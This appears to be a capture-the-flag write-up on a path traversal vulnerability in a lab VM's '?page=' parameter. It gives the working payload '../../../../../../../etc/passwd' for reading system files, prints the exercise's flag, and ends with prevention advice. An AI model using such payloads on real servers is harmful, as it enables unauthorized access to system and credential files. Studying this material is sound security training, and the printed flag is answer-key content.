# Path Traversal

Directory traversal is a navigation technique that can be used gain unauthorized access to the file system.
It's also known as the ../ (dot dot slash) attack, directory climbing, and backtracking. 


## Exploit

Go to page:

{VM_IP}/?page=signin

* "?page=" is a open gate to the server
* Remove "signin" and add "/etc/passwd"
* Keep adding '../' after "?page=" to see if you reach a file system
* And...   {VM_IP}/?page=../../../../../../../etc/passwd is the winner!

Flag = b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 


## Use

If your site is indexed on Google, and you have URLs that pass file names in the query string, 
you are likely advertising a potential vulnerability to attackers.

A successful directory traversal attack can be used to gain access to passwords, user and admin info, etc. 


## Prevention

- avoid passing around raw file paths. 
- Consider using indirection to label your files. Each time a file is uploaded, construct a “friendly” name for this on your site, 
and when the file is accessed, perform a lookup in your data-store to discover the actual file path.
- It is a good practice to run your server processes with only the permissions that they require to function (the principle of least privilege).

[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
